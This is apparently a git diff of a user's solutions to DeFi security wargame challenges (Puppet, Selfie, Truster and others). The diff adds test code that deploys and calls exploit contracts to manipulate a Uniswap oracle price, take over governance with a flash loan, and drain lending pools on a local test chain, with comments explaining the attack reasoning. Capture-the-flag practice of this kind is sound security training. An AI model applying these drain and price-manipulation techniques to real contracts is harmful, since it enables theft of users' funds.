+diff --git a/test/puppet/puppet.challenge.js b/test/puppet/puppet.challenge.js
+index 2f72719..4954cec 100644
+--- a/test/puppet/puppet.challenge.js
++++ b/test/puppet/puppet.challenge.js
+@@ -4,12 +4,87 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
+ const { ethers } = require('hardhat');
+ const { expect } = require('chai');
+ const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
++const { time } = require('@nomicfoundation/hardhat-network-helpers');
++const ethJsUtil = require('ethereumjs-util');
+ 
+ // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
+ function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
+     return (tokensSold * 997n * etherInReserve) / (tokensInReserve * 1000n + tokensSold * 997n);
+ }
+ 
++const rlp = require("rlp");
++const keccak = require("keccak");
++
++async function predictContractAddress(deployer) {
++
++  const nonce = await ethers.provider.getTransactionCount(deployer.address); //The nonce must be a hex literal!
++  const sender = deployer.address; //Requires a hex string as input!
++
++  const input_arr = [sender, nonce];
++  const rlp_encoded = rlp.encode(input_arr);
++
++  const contract_address_long = keccak("keccak256")
++    .update(rlp_encoded)
++    .digest("hex");
++
++  const contract_address = contract_address_long.substring(24); //Trim the first 24 characters.
++  return contract_address;
++}
++
++async function doArbitrage(value, ...params) {
++  const chainId = (await ethers.provider.getNetwork()).chainId;
++  // set the domain parameters
++  const domain = {
++    name: await token.name(),
++    version: "1",
++    chainId: chainId,
++    verifyingContract: token.address
++  };
++
++  // set the Permit type parameters
++  const types = {
++    Permit: [{
++        name: "owner",
++        type: "address"
++      },
++      {
++        name: "spender",
++        type: "address"
++      },
++      {
++        name: "value",
++        type: "uint256"
++      },
++      {
++        name: "nonce",
++        type: "uint256"
++      },
++      {
++        name: "deadline",
++        type: "uint256"
++      },
++    ],
++  };
++
++  const predictedAddress = await predictContractAddress(player);
++  console.log("predicted address: " + predictedAddress);
++
++  const deadline = (await time.latest()) + 9999999;
++  const values = {
++    owner: player.address,
++    spender: predictedAddress,
++    value: PLAYER_INITIAL_TOKEN_BALANCE,
++    nonce: await token.nonces(player.address),
++    deadline: deadline,
++  };
++  const signature = await player._signTypedData(domain, types, values);
++  const sig = ethers.utils.splitSignature(signature);
++
++  const arbitrageContract = await (await ethers.getContractFactory('Arbitrage', player)).deploy(...params, sig.v, sig.r, sig.s, { value });
++
++  console.log(`Actual address: ${arbitrageContract.address}`);
++}
++
+ describe('[Challenge] Puppet', function () {
+     let deployer, player;
+     let token, exchangeTemplate, uniswapFactory, uniswapExchange, lendingPool;
+@@ -95,6 +170,101 @@ describe('[Challenge] Puppet', function () {
+ 
+     it('Execution', async function () {
+         /** CODE YOUR SOLUTION HERE */
++      // pool has 100K DVT tokens and 0 ETH balance
++      // player have to take all tokens from pool in a single transaction
++      // player can only call borrow funstion
++      // player should provide calculateDepositRequired(100K DVT) ETh to bowwor all tokens
++      const uniswapExchangeEthBalance = await ethers.provider.getBalance(uniswapExchange.address);
++      const uniswapExchangeTokenBalance = await token.balanceOf(uniswapExchange.address);
++      const oraclePrice = uniswapExchangeEthBalance * (10 ** 18) / uniswapExchangeTokenBalance;
++      console.log(`uniswapExchange balance is ${uniswapExchangeEthBalance}`);
++      console.log(`uniswapExchange token balance is ${uniswapExchangeTokenBalance}`);
++      console.log(`Oracle price is ${oraclePrice}`);
++      console.log(`Deposit required is ${await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)}`)
++
++      // initially exchange price is 10^18
++      // so 2 ETH have to be deposited per each DVT
++      // that would be 200K ETH
++      // player only has 25ETH and 1K DVT tokens
++      // minimal deposit to borrow 100K DVT tokens is 24ETH - as player also pays transaction fee
++      // oracle price should be less than: 100K * x * 2 = 24 => x = 12 /100 = 0.12
++      // I should set oracle price to less than 0.12
++      // exchETH * 10^18 / exchDVT = 0.12 => exchDVT * 0.12 = echhETH * 10^18 => exchDVT = exchETH * 8.33333 * 10^18
++      // let's set exchDVT = exchETH * 10 * 10^18
++      // let's swap tokens in pool to manipulate oracle price
++      // Pool: 10 DVT and 10 ETH
++      // Player: 1000DVT and 25 ETH
++      // Oracle price: 10^18
++      // To lower the price we should have less ETH and more tokens
++      // Swap eth to tokens will lower the price
++      // Add tokens will also lower the price but addLiquidity preserves ration - thus this is not an option
++      // 
++
++
++
++      /// Solution starts
++        //await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
++        //const deadline = await time.latest();
++        //console.log(`Deadline is: ${deadline}`);
++        //await uniswapExchange.connect(player).tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 1, deadline + 9999999);
++        //const depositValue = await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
++        //console.log(`Deposit required is ${depositValue}`);
++        //await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {value: depositValue});
++      /// solution ends
++
++      //await (await ethers.getContractFactory('CrackPuppet', player)).deploy(uniswapExchange.address, token.address, lendingPool.address, { value: 24n * 10n ** 18n,  gasLimit: 30000000 });
++
++    const chainId = (await ethers.provider.getNetwork()).chainId;
++    // set the domain parameters
++    const domain = {
++      name: await token.name(),
++      version: "1",
++      chainId: chainId,
++      verifyingContract: token.address
++    };
++  
++    // set the Permit type parameters
++    const types = {
++      Permit: [{
++          name: "owner",
++          type: "address"
++        },
++        {
++          name: "spender",
++          type: "address"
++        },
++        {
++          name: "value",
++          type: "uint256"
++        },
++        {
++          name: "nonce",
++          type: "uint256"
++        },
++        {
++          name: "deadline",
++          type: "uint256"
++        },
++      ],
++    };
++
++    const predictedAddress = await predictContractAddress(player);
++    console.log("predicted address: " + predictedAddress);
++
++    const deadline = (await time.latest()) + 9999999;
++    const values = {
++      owner: player.address,
++      spender: predictedAddress,
++      value: PLAYER_INITIAL_TOKEN_BALANCE,
++      nonce: 0,
++      deadline: deadline,
++    };
++    const signature = await player._signTypedData(domain, types, values);
++    const sig = ethers.utils.splitSignature(signature);
++
++    const crackPuppet = await (await ethers.getContractFactory('CrackPuppet', player)).deploy(uniswapExchange.address, token.address, lendingPool.address, deadline, sig.v, sig.r, sig.s, {value: 24n * 10n ** 18n });
++
++    console.log(`Actual address: ${crackPuppet.address}`);
+     });
+ 
+     after(async function () {
+@@ -111,4 +281,4 @@ describe('[Challenge] Puppet', function () {
+             await token.balanceOf(player.address)
+         ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE, 'Not enough token balance in player');
+     });
+-});
+\ No newline at end of file
++});
+diff --git a/test/selfie/selfie.challenge.js b/test/selfie/selfie.challenge.js
+index aa04005..2ffccaf 100644
+--- a/test/selfie/selfie.challenge.js
++++ b/test/selfie/selfie.challenge.js
+@@ -39,6 +39,18 @@ describe('[Challenge] Selfie', function () {
+ 
+     it('Execution', async function () {
+         /** CODE YOUR SOLUTION HERE */
++      // token and governance token are the same
++      // take a flashLoan > TOKEN_INITIAL_SUPPLY / 2
++      // queueAction emergencyExit
++      // re-pay flash flashLoan
++      // move forward for 2 days
++      // execute action
++      
++      //deploy exploit
++      const exploit = await (await ethers.getContractFactory('ExploitSelfiePool', player)).deploy(pool.address, token.address);
++      await exploit.hackIt();
++      await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
++      await governance.executeAction(await exploit.actionId());
+     });
+ 
+     after(async function () {
+diff --git a/test/side-entrance/side-entrance.challenge.js b/test/side-entrance/side-entrance.challenge.js
+index d62e905..2cc88d1 100644
+--- a/test/side-entrance/side-entrance.challenge.js
++++ b/test/side-entrance/side-entrance.challenge.js
+@@ -26,6 +26,12 @@ describe('[Challenge] Side entrance', function () {
+ 
+     it('Execution', async function () {
+         /** CODE YOUR SOLUTION HERE */
++      // during execute do deposit
++      // then withdraw
++      let exploit = await (await ethers.getContractFactory('Exploit', player)).deploy();
++      await exploit.drainPool(pool.address);
++      expect(await pool.balances(exploit.address)).to.eq(ETHER_IN_POOL);
++      await exploit.connect(player).withdraw();
+     });
+ 
+     after(async function () {
+diff --git a/test/the-rewarder/the-rewarder.challenge.js b/test/the-rewarder/the-rewarder.challenge.js
+index 8b0c31c..4309fcb 100644
+--- a/test/the-rewarder/the-rewarder.challenge.js
++++ b/test/the-rewarder/the-rewarder.challenge.js
+@@ -70,6 +70,12 @@ describe('[Challenge] The rewarder', function () {
+ 
+     it('Execution', async function () {
+         /** CODE YOUR SOLUTION HERE */
++
++        const ExploitFactory = await ethers.getContractFactory('ExploitTheRewarder', player);
++        const exploit = await ExploitFactory.deploy(flashLoanPool.address, liquidityToken.address, rewarderPool.address);
++        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
++        await exploit.hackIt();
++        await exploit.claimRewards(rewardToken.address);
+     });
+ 
+     after(async function () {
+diff --git a/test/truster/truster.challenge.js b/test/truster/truster.challenge.js
+index 8302670..8db9d1d 100644
+--- a/test/truster/truster.challenge.js
++++ b/test/truster/truster.challenge.js
+@@ -23,6 +23,12 @@ describe('[Challenge] Truster', function () {
+ 
+     it('Execution', async function () {
+         /** CODE YOUR SOLUTION HERE */
++      //bytes memory payload = abi.encodeWithSignature("flashLoan(uint256, address, address, bytes)", TOKENS_IN_POOL, player.address, pool.address);
++      const DrainFundsFactory = await ethers.getContractFactory('DrainFunds', player);
++      let drainFunds = await DrainFundsFactory.deploy(pool.address, token.address);
++      await drainFunds.drain();
++      //const payload = abi.encodeWithSignature("flashLoan(uint256,address,address,bytes)", 0, player.address, pool.address, "0x");
++      //await pool.connect(player).flashLoan(0, player.address, drainFunds.address, "0x");
+     });
+ 
+     after(async function () {
+diff --git a/test/unstoppable/unstoppable.challenge.js b/test/unstoppable/unstoppable.challenge.js
+index 83a8990..fe85d70 100644
+--- a/test/unstoppable/unstoppable.challenge.js
++++ b/test/unstoppable/unstoppable.challenge.js
+@@ -45,6 +45,8 @@ describe('[Challenge] Unstoppable', function () {
+ 
+     it('Execution', async function () {
+         /** CODE YOUR SOLUTION HERE */
++      await token.connect(player).transfer(vault.address, 2n * 10n ** 18n);
++      expect(await vault.totalAssets()).to.eq(TOKENS_IN_VAULT + 2n * 10n ** 18n);
+     });
+ 
+     after(async function () {
+diff --git a/yarn.lock b/yarn.lock
+index fd1d583..b0a81fc 100644
+--- a/yarn.lock
++++ b/yarn.lock
+@@ -532,7 +532,7 @@
+     deep-eql "^4.0.1"
+     ordinal "^1.0.3"
+ 
+-"@nomicfoundation/hardhat-network-helpers@^1.0.6":
++"@nomicfoundation/hardhat-network-helpers@1.0.6":
+   version "1.0.6"
+   resolved "https://registry.yarnpkg.com/@nomicfoundation/hardhat-network-helpers/-/hardhat-network-helpers-1.0.6.tgz#5e2026ddde5ca539f70a2bf498528afd08bd0827"
+   integrity sha512-a35iVD4ycF6AoTfllAnKm96IPIzzHpgKX/ep4oKc2bsUKFfMlacWdyntgC/7d5blyCTXfFssgNAvXDZfzNWVGQ==
+@@ -1396,7 +1396,7 @@ escape-string-regexp@^1.0.5:
+   resolved "https://registry.yarnpkg.com/escape-string-regexp/-/escape-string-regexp-1.0.5.tgz#1b61c0562190a8dff6ae3bb2cf0200ca130b86d4"
+   integrity sha512-vbRorB5FUQWvla16U8R/qgaFIya2qGzwDrNmCZuYKrbdSUMG6I1ZCGQRefkRVhuOkIGVne7BQ35DSfo1qvJqFg==
+ 
+-eth-permit@^0.2.3:
++eth-permit@0.2.3:
+   version "0.2.3"
+   resolved "https://registry.yarnpkg.com/eth-permit/-/eth-permit-0.2.3.tgz#7d8b051e329d2166fef32553ed397970d369cafe"
+   integrity sha512-d4tbiRQgbpdeJbdC9hdyT0SUJcJx28FIy3o2RxEAoeYI+zyYbNC0ZpdE6kxBK+7iY2payjHRE7rs7tr5EcOVLg==
+@@ -2449,7 +2449,7 @@ solidity-ast@^0.4.15:
+   resolved "https://registry.yarnpkg.com/solidity-ast/-/solidity-ast-0.4.35.tgz#82e064b14dc989338123264bde2235cad751f128"
+   integrity sha512-F5bTDLh3rmDxRmLSrs3qt3nvxJprWSEkS7h2KmuXDx7XTfJ6ZKVTV1rtPIYCqJAuPsU/qa8YUeFn7jdOAZcTPA==
+ 
+-solmate@^6.6.1:
++solmate@6.6.1:
+   version "6.6.1"
+   resolved "https://registry.yarnpkg.com/solmate/-/solmate-6.6.1.tgz#f0907e1cdada6dd5fbfe11811ab545162b713197"
+   integrity sha512-WHvRXQvGtgR6R9nmkDTz/d+oULMqf/D33rlzQyadTX2SbuTmaW7ToEjGjGtWUVCQwZsZ/JP3vbOEVv7fB50btg==
+-- 
+2.39.1
+
